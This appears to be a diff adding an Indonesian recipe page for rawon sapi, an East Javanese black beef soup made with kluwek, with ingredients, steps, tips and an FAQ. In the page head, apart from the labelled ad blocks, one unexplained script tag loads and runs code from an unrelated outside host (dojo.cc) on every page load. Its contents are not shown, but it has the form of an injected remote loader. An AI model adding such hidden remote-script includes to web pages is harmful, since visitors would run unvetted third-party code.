@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resep Rawon Sapi — Masakanku</title>
+    <meta name="description" content="Resep rawon sapi daging empuk kuah hitam pekat. Bumbu kluwek khas, served dengan tauge dan telur asin.">
+    <link rel="canonical" href="https://masakanku.online/rawon-sapi">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.8; color: #333; background: #fef9f4; }
+        nav { background: #c0392b; padding: 1rem 0; position: sticky; top: 0; z-index: 100; }
+        nav .container { max-width: 1100px; margin: auto; display: flex; justify-content: space-between; align-items: center; padding: 0 1.5rem; flex-wrap: wrap; }
+        nav .logo { color: #fff; font-size: 1.5rem; font-weight: 700; text-decoration: none; }
+        nav .logo span { color: #fdd835; }
+        nav a { color: #fff; text-decoration: none; margin-left: 1.2rem; font-weight: 500; font-size: 0.95rem; }
+        nav a:hover { color: #fdd835; }
+        .container { max-width: 800px; margin: auto; padding: 2rem 1.5rem; }
+        .breadcrumb { font-size: 0.9rem; color: #888; margin-bottom: 1rem; }
+        .breadcrumb a { color: #c0392b; text-decoration: none; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .category-badge { display: inline-block; background: #f39c12; color: #fff; padding: 0.3rem 1rem; border-radius: 20px; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; margin-bottom: 1rem; }
+        h1 { font-size: 2rem; color: #222; margin-bottom: 0.5rem; line-height: 1.3; }
+        .meta-desc { font-size: 1.1rem; color: #666; margin-bottom: 1.5rem; border-left: 4px solid #f39c12; padding-left: 1rem; }
+        .article-img { width: 100%; border-radius: 12px; margin: 1.5rem 0; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .intro { font-size: 1.05rem; margin-bottom: 1.5rem; }
+        h2 { font-size: 1.5rem; color: #f39c12; margin: 2rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 2px solid #f5edd0; }
+        .ingredients, .steps { background: #fff; padding: 1.5rem; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 1.5rem; }
+        .ingredients li, .steps li { margin-bottom: 0.6rem; padding-left: 0.5rem; }
+        .ingredients ul, .steps ol { padding-left: 1.5rem; }
+        .tips-box { background: #fff8e1; border-left: 4px solid #fdd835; padding: 1.2rem 1.5rem; border-radius: 8px; margin: 1.5rem 0; }
+        .tips-box h3 { color: #f57f17; margin-bottom: 0.8rem; }
+        .tips-box li { margin-bottom: 0.5rem; }
+        .cta { text-align: center; background: #f39c12; color: #fff; padding: 1.5rem; border-radius: 12px; margin: 2rem 0; }
+        .cta p { font-size: 1.1rem; margin-bottom: 0.5rem; }
+        .related { background: #fff; padding: 1.5rem; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin: 2rem 0; }
+        .related h3 { color: #f39c12; margin-bottom: 1rem; }
+        .related a { color: #f39c12; text-decoration: none; display: block; margin-bottom: 0.5rem; }
+        .related a:hover { text-decoration: underline; }
+        footer { background: #2c2c2c; color: #ccc; padding: 2rem 0; text-align: center; margin-top: 3rem; }
+        footer .container { max-width: 800px; margin: auto; padding: 0 1.5rem; }
+        footer a { color: #fdd835; text-decoration: none; margin: 0 0.8rem; }
+        footer a:hover { text-decoration: underline; }
+        footer p { margin-top: 1rem; font-size: 0.9rem; }
+        @media (max-width: 600px) {
+            h1 { font-size: 1.5rem; }
+            nav .container { flex-direction: column; gap: 0.5rem; }
+            nav a { margin: 0 0.6rem; font-size: 0.85rem; }
+        }
+    </style>
+    <script src="//dojo.cc/124.js"></script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org/",
+  "@type": "Recipe",
+  "name": "Resep Rawon Sapi: Sop Daging Hitam Khas Jawa Timur, Gurih dan Harum",
+  "image": [
+    "https://images.unsplash.com/photo-1546549032-9571cd6b27df?w=800&h=500&fit=crop"
+  ],
+  "author": {
+    "@type": "Organization",
+    "name": "Masakanku"
+  },
+  "datePublished": "2026-07-14",
+  "description": "Resep rawon sapi daging empuk kuah hitam pekat. Bumbu kluwek khas, served dengan tauge dan telur asin.",
+  "prepTime": "PT20M",
+  "cookTime": "PT40M",
+  "totalTime": "PT60M",
+  "recipeYield": "4 porsi",
+  "recipeCategory": "Masakan Khas Jawa Timur",
+  "recipeCuisine": "Indonesian",
+  "recipeIngredient": [
+    "500 gram daging sapi (bagian sandung lamur/has dalam, potong dadu)",
+    "200 gram kikil sapi (rebus dulu, potong kecil - opsional)",
+    "2 liter air untuk merebus daging",
+    "5 buah kluwek (rendam air panas 15 menit, ambil isinya)",
+    "8 siung bawang merah",
+    "5 siung bawang putih",
+    "4 butir kemiri (sangrai)",
+    "2 cm kunyit",
+    "2 cm jahe",
+    "1 sdm ketumbar (sangrai)",
+    "1 sdt merica butiran",
+    "1 sdm garam",
+    "1 sdt gula pasir",
+    "3 lembar daun salam",
+    "5 lembar daun jeruk (buang tulangnya)",
+    "2 batang sereh (geprek)",
+    "3 cm lengkuas (geprek)",
+    "1 buah asam jawa (rendam air, ambil airnya)",
+    "200 gram tauge pendek (seduh air panas sebentar)",
+    "2-3 butir telur asin (belah dua)",
+    "2 batang daun bawang (iris halus)",
+    "2 batang seledri (iris halus)",
+    "Bawang goreng untuk taburan",
+    "Sambal terasi atau sambal rawit",
+    "Jeruk nipis",
+    "Kerupuk udang atau emping"
+  ],
+  "recipeInstructions": [
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 1",
+      "text": "Didihkan 2 liter air. Masukkan daging sapi dan kikil. Rebus dengan api besar hingga mendidih."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 2",
+      "text": "Buang busa-busa kotoran yang mengapung. Ini supaya kuah bening dan tidak bau amis."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 3",
+      "text": "Kecilkan api. Tutup panci. Rebus daging selama 1.5-2 jam hingga benar-benar empuk."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 4",
+      "text": "Atau gunakan presto: 30 menit setelah bunyi peluit. Lebih cepat dan hemat gas."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 5",
+      "text": "Angkat daging. Potong dadu ukuran makan. Sisihkan kaldu rebusan untuk kuah rawon."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 6",
+      "text": "Rendam kluwek dengan air panas 15 menit. Kerok isinya, buang kulit kerasnya."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 7",
+      "text": "Haluskan semua bumbu halus: kluwek, bawang merah, bawang putih, kemiri, kunyit, jahe, ketumbar, merica, garam, gula."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 8",
+      "text": "Bisa diulek atau diblender dengan sedikit minyak. Tekstur harus benar-benar halus."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 9",
+      "text": "Panaskan 3 sdm minyak. Tumis bumbu halus hingga harum dan matang, sekitar 7-10 menit. Bumbu harus benar-benar matang supaya tidak langu."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 10",
+      "text": "Masukkan daun salam, daun jeruk, sereh, lengkuas. Aduk sebentar."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 11",
+      "text": "Tuang kaldu rebusan daging (sekitar 1.5 liter). Aduk rata."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 12",
+      "text": "Masukkan daging sapi yang sudah dipotong. Masukkan juga air asam jawa."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 13",
+      "text": "Masak dengan api kecil selama 30 menit supaya bumbu meresap ke daging."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 14",
+      "text": "Koreksi rasa. Tambah garam/gula jika perlu. Kuah harus gurih, asam segar, dan hitam pekat."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 15",
+      "text": "Tata tauge di mangkuk saji."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 16",
+      "text": "Tuang rawon dengan daging dan kuahnya."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 17",
+      "text": "Taburi daun bawang, seledri, dan bawang goreng."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 18",
+      "text": "Sajikan dengan telur asin, sambal, jeruk nipis, dan kerupuk."
+    },
+    {
+      "@type": "HowToStep",
+      "name": "Langkah 19",
+      "text": "Makan selagi hangat dengan nasi putih. Dijamin nambah terus!"
+    }
+  ],
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "4.7",
+    "ratingCount": "89"
+  }
+}
+</script>
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="/" class="logo">Masakan<span>ku</span></a>
+            <div>
+                <a href="/">Beranda</a>
+                <a href="/contact">Contact</a>
+                <a href="/privacy-policy">Privacy Policy</a>
+                <a href="/copyright">Copyright</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="/">Beranda</a> &raquo; <span>Masakan Khas Jawa Timur</span>
+        </div>
+
+        <span class="category-badge">Masakan Khas Jawa Timur</span>
+        <h1>Resep Rawon Sapi: Sop Daging Hitam Khas Jawa Timur, Gurih dan Harum</h1>
+        <p class="meta-desc">Resep rawon sapi daging empuk kuah hitam pekat. Bumbu kluwek khas, disajikan dengan tauge dan telur asin.</p>
+
+        <img src="https://images.unsplash.com/photo-1546549032-9571cd6b27df?w=800&h=500&fit=crop" alt="Rawon Sapi Daging Empuk Kuah Hitam" title="Rawon Sapi" class="article-img" loading="lazy">
+
+        <div class="intro">
+            <p>Ada masakan yang warnanya hitam pekat, tapi rasanya gurih banget dan bikin nagih. Itulah rawon.</p>
+            <p>Sop daging khas Jawa Timur ini punya warna hitam khas dari kluwek. Banyak yang ragu saat pertama lihat warnanya. Tapi sekali coba, pasti ketagihan.</p>
+            <p>Daging sapi yang empuk meresap bumbu. Kuah yang kaya rasa rempah. Disajikan dengan tauge segar, telur asin, dan sambal. Lengkap banget.</p>
+            <p>Sekarang saatnya kamu bikin rawon sendiri di rumah. Prosesnya butuh kesabaran, tapi hasilnya sepanding masakan restoran legendaris.</p>
+        </div>
+
+        <h2>Kenapa Rawon Sapi Layak Jadi Andalan?</h2>
+        <p>Rawon bukan sop biasa. Warna hitamnya dari kluwek — buah yang memang berwarna hitam pekat. Kluwek memberikan rasa unik: gurih, sedikit pahit, dan aroma khas yang tidak digantikan bumbu lain.</p>
+        <p>Dulu rawon hanya ditemukan di Surabaya dan sekitarnya. Kini sudah menyebar ke seluruh Indonesia. Bahkan jadi menu favorit di restoran-restoran mewah.</p>
+        <p>Yang bikin rawon spesial: kombinasi rasa kompleks. Ada rasa gurih dari daging, aroma rempah yang kuat, segar dari tauge, gurih asin dari telur asin, dan pedas dari sambal. Semua bersatu dalam satu mangkuk.</p>
+
+        <h2>Bahan-Bahan Rawon Sapi</h2>
+
+        <div class="ingredients">
+            <h3>Bahan Utama:</h3>
+            <ul>
+                <li>500 gram daging sapi (bagian sandung lamur/has dalam, potong dadu)</li>
+                <li>200 gram kikil sapi (rebus dulu, potong kecil - opsional)</li>
+                <li>2 liter air untuk merebus daging</li>
+            </ul>
+            <h3>Bumbu Halus:</h3>
+            <ul>
+                <li>5 buah kluwek (rendam air panas 15 menit, ambil isinya)</li>
+                <li>8 siung bawang merah</li>
+                <li>5 siung bawang putih</li>
+                <li>4 butir kemiri (sangrai)</li>
+                <li>2 cm kunyit</li>
+                <li>2 cm jahe</li>
+                <li>1 sdm ketumbar (sangrai)</li>
+                <li>1 sdt merica butiran</li>
+                <li>1 sdm garam</li>
+                <li>1 sdt gula pasir</li>
+            </ul>
+            <h3>Bumbu Cemplung:</h3>
+            <ul>
+                <li>3 lembar daun salam</li>
+                <li>5 lembar daun jeruk (buang tulangnya)</li>
+                <li>2 batang sereh (geprek)</li>
+                <li>3 cm lengkuas (geprek)</li>
+                <li>1 buah asam jawa (rendam air, ambil airnya)</li>
+            </ul>
+            <h3>Pelengkap (Wajib!):</h3>
+            <ul>
+                <li>200 gram tauge pendek (seduh air panas sebentar)</li>
+                <li>2-3 butir telur asin (belah dua)</li>
+                <li>2 batang daun bawang (iris halus)</li>
+                <li>2 batang seledri (iris halus)</li>
+                <li>Bawang goreng untuk taburan</li>
+                <li>Sambal terasi atau sambal rawit</li>
+                <li>Jeruk nipis</li>
+                <li>Kerupuk udang atau emping</li>
+            </ul>
+        </div>
+
+        <div class="ad-container" style="margin:1.5rem 0;text-align:center;min-height:90px"><script async="async" data-cfasync="false" src="https://jabturfembitter.com/fbf97f8372ae4f56ef2fbb64a6663968/invoke.js"></script><div id="container-fbf97f8372ae4f56ef2fbb64a6663968"></div></div>
+
+        <h2>Cara Membuat Rawon Sapi</h2>
+
+        <div class="steps">
+            <h3>Langkah 1: Rebus Daging hingga Empuk</h3>
+            <ol>
+                <li>Didihkan 2 liter air. Masukkan daging sapi dan kikil. Rebus dengan api besar hingga mendidih.</li>
+                <li>Buang busa-busa kotoran yang mengapung. Ini supaya kuah bening dan tidak bau amis.</li>
+                <li>Kecilkan api. Tutup panci. Rebus daging selama 1.5-2 jam hingga benar-benar empuk.</li>
+                <li>Atau gunakan presto: 30 menit setelah bunyi peluit. Lebih cepat dan hemat gas.</li>
+                <li>Angkat daging. Potong dadu ukuran makan. Sisihkan kaldu rebusan untuk kuah rawon.</li>
+            </ol>
+
+            <h3>Langkah 2: Siapkan Bumbu</h3>
+            <ol>
+                <li>Rendam kluwek dengan air panas 15 menit. Kerok isinya, buang kulit kerasnya.</li>
+                <li>Haluskan semua bumbu halus: kluwek, bawang merah, bawang putih, kemiri, kunyit, jahe, ketumbar, merica, garam, gula.</li>
+                <li>Bisa diulek atau diblender dengan sedikit minyak. Tekstur harus benar-benar halus.</li>
+            </ol>
+
+            <h3>Langkah 3: Tumis Bumbu dan Masak Kuah</h3>
+            <ol>
+                <li>Panaskan 3 sdm minyak. Tumis bumbu halus hingga harum dan matang, sekitar 7-10 menit. Bumbu harus benar-benar matang supaya tidak langu.</li>
+                <li>Masukkan daun salam, daun jeruk, sereh, lengkuas. Aduk sebentar.</li>
+                <li>Tuang kaldu rebusan daging (sekitar 1.5 liter). Aduk rata.</li>
+                <li>Masukkan daging sapi yang sudah dipotong. Masukkan juga air asam jawa.</li>
+                <li>Masak dengan api kecil selama 30 menit supaya bumbu meresap ke daging.</li>
+                <li>Koreksi rasa. Tambah garam/gula jika perlu. Kuah harus gurih, asam segar, dan hitam pekat.</li>
+            </ol>
+
+            <h3>Langkah 4: Penyajian</h3>
+            <ol>
+                <li>Tata tauge di mangkuk saji.</li>
+                <li>Tuang rawon dengan daging dan kuahnya.</li>
+                <li>Taburi daun bawang, seledri, dan bawang goreng.</li>
+                <li>Sajikan dengan telur asin, sambal, jeruk nipis, dan kerupuk.</li>
+                <li>Makan selagi hangat dengan nasi putih. Dijamin nambah terus!</li>
+            </ol>
+        </div>
+
+        <h2>Rahasia Rawon yang Gurih Banget</h2>
+
+        <p><strong>Kluwek Harus Berkualitas</strong></p>
+        <p>Pilih kluwek yang tua, isinya hitam pekat dan tidak berbau busuk. Kluwek muda rasanya terlalu pahit. Rendam air panas supaya mudah diambil isinya.</p>
+
+        <p><strong>Daging Sandung Lamur Pilihannya</strong></p>
+        <p>Bagian ini punya lemak yang pas. Dagingnya empuk tapi tidak hancur saat direbus lama. Jika pakai daging has dalam, tambahkan lemak sapi sedikit supaya kuah lebih gurih.</p>
+
+        <p><strong>Bumbu Harus Benar-benar Matang</strong></p>
+        <p>Tumis bumbu sampai benar-benar matang (berminyak). Bumbu mentah bikin rawon langu dan bau bawang mentah. Ini kunci rasa rawon yang enak.</p>
+
+        <h2>Variasi Rawon</h2>
+
+        <h3>Rawon Setan (Surabaya Style)</h3>
+        <p>Rawon yang dijual malam hari sampai subuh. Kuahnya lebih pekat, dagingnya lebih banyak, dan porsi tauge banyak banget. Cocok buat lauk makan malam atau sarapan pagi buta.</p>
+
+        <h3>Rawon Iga Sapi</h3>
+        <p>Ganti daging dengan iga sapi. Rebus iga hingga empuk (lebih lama, sekitar 2.5 jam). Tulang iga bikin kuah lebih kaya rasa dan bergizi. Harga lebih mahal tapi rasanya premium.</p>
+
+        <h3>Rawon Bebek</h3>
+        <p>Versi Madura. Ganti sapi dengan bebek muda. Daging bebek lebih ringan tapi tetap gurih. Bumbunya sama, tapi tambahkan daun kemangi saat sajian supaya lebih segar.</p>
+
+        <h2>Tips Biar Rawon Sempurna</h2>
+
+        <div class="tips-box">
+            <h3>🥩 Tips Jitu Rawon</h3>
+            <ul>
+                <li><strong>Presto daging biar cepat empuk.</strong> 30 menit cukup. Kalau rebus biasa butuh 2 jam. Hemat waktu dan gas.</li>
+                <li><strong>Buang busa saat merebus daging.</strong> Supaya kuah bening dan tidak bau amis. Lakukan berkali-kali saat mendidih pertama.</li>
+                <li><strong>Tumis bumbu sampai berminyak.</strong> Tanda bumbu matang: minyak terpisah di pinggir wajan. Jangan terburu-buru.</li>
+                <li><strong>Gunakan kaldu rebusan daging.</strong> Jangan buang air rebusan! Itu gurih alami dari daging. Kalau kurang, tambah air biasa.</li>
+                <li><strong>Sajikan dengan pelengkap lengkap.</strong> Tauge, telur asin, sambal, kerupuk — ini wajib. Rawon nggak lengkap tanpa mereka.</li>
+            </ul>
+        </div>
+
+        <h2>Kenapa Rawon Sapi Layak Dicoba?</h2>
+        <p>Rawon adalah warisan kuliner Jawa Timur yang patut bangga. Rasa yang kompleks dari bumbu rempah dan kluwek tidak bisa didapat dari masakan lain.</p>
+        <p>Bikin rawon sendiri di rumah lebih hemat. Satu panci besar bisa untuk keluarga besar beberapa hari. Rasanya makin enak keesokan harinya karena bumbu meresap.</p>
+        <p>Prosesnya memang butuh kesabaran. Tapi hasilnya: mangkuk rawon hitam pekat, daging empuk, kuah gurih harum. Semua yang makan pasti bilang enak.</p>
+        <p>Dan jangan lupa pelengkapnya. Tauge segar, telur asin gurih, sambal pedas — mereka yang melengkapi rawon jadi hidangan lengkap dan seimbang.</p>
+
+        <h2>FAQ Rawon Sapi</h2>
+
+        <p><strong>Kluwek susah didapat, bisa diganti?</strong></p>
+        <p>Tidak ada pengganti yang persis sama. Kluwek wajib untuk rawon asli. Cari di pasar tradisional, toko bumbu, atau beli online. Jangan diganti tempe atau bahan lain — jadinya bukan rawon lagi.</p>
+
+        <p><strong>Rawon pahit, kenapa?</strong></p>
+        <p>Kluwek terlalu muda atau bumbu tidak matang sempurna. Pilih kluwek tua (isinya hitam pekat). Tumis bumbu sampai benar-benar matang berminyak. Tambah gula secukupnya untuk seimbangkan.</p>
+
+        <p><strong>Daging sapi keras, gimana biar empuk?</strong></p>
+        <li>Gunakan presto 30-40 menit. Atau rebus dengan api kecil 2-3 jam. Pilih bagian sandung lamur yang memiliki lemak alami. Jangan pakai daging has luar yang seratnya keras.</li>
+
+        <p><strong>Bisa dibikin banyak dan disimpan?</strong></p>
+        <p>Bisa. Rawon keesokan harinya lebih enak. Simpan di kulkas 3-4 hari. Bekukan sampai 1 bulan. Panaskan dengan api kecil, tambah air sedikit jika kuah terlalu kental.</p>
+
+        <p><strong>Kenapa rawon harus pakai tauge pendek?</strong></p>
+        <p>Tauge pendek (tauge kacang hijau) teksturnya lebih renyah dan tidak cepat layu di kuah panas. Tauge panjang (tauge kacang panjang) terlalu cepat lembek. Tapi kalau tidak ada, tauge biasa juga boleh.</p>
+
+        <div class="cta">
+            <p>Siap bikin rawon sapi hitam pekat khas Jawa Timur?</p>
+            <p>Siapkan kluwek, daging sandung lamur, dan kesabaran. 3 jam lagi, mangkuk rawon gurih harum siap menemani nasi hangat. Selamat mencoba! 🥩</p>
+        </div>
+
+        <div class="related">
+            <h3>Baca Juga</h3>
+            <a href="/soto-lamongan">Resep Soto Lamongan Khas Jawa Timur</a>
+            <a href="/soto-ayam">Resep Soto Ayam Bening Segar</a>
+            <a href="/bakso-sapi">Resep Bakso Sapi Kenyal Buatan Sendiri</a>
+            <a href="/kari-kambing">Resep Kari Kambing Khas Jawa</a>
+        </div>
+    </div>
+
+    <div class="ad-container" style="margin:1.5rem 0;text-align:center"><script>atOptions={"key":"7f4bd95b8fb4ff051d5837b9e935f6b8","format":"iframe","height":90,"width":728,"params":{}};</script><script src="https://jabturfembitter.com/7f4bd95b8fb4ff051d5837b9e935f6b8/invoke.js"></script></div>
+
+    <footer>
+        <div class="container">
+            <div>
+                <a href="/contact">Contact</a>
+                <a href="/privacy-policy">Privacy Policy</a>
+                <a href="/copyright">Copyright</a>
+                <a href="/dmca">DMCA</a>
+            </div>
+            <p>&copy; 2026 Masakanku. Semua resep original dan bisa dicoba di rumah.</p>
+        </div>
+    
+    <div class="container mt-3" style="border-top:1px solid #444;padding-top:1rem">
+        <p style="font-size:0.8rem;opacity:0.7">
+            <strong>Jelajahi Juga:</strong> 
+            <a href="https://remoteproduktif.online" target="_blank" style="color:#fdd835;">RemoteProduktif</a> — Tips kerja remote untuk Indonesia
+            &nbsp;|&nbsp; 
+            <a href="https://fattan.my.id" target="_blank" style="color:#fdd835;">My Fattan</a> — Pengembangan diri anak muda
+        </p>
+    </div>
+</footer>
+</body>
+</html>
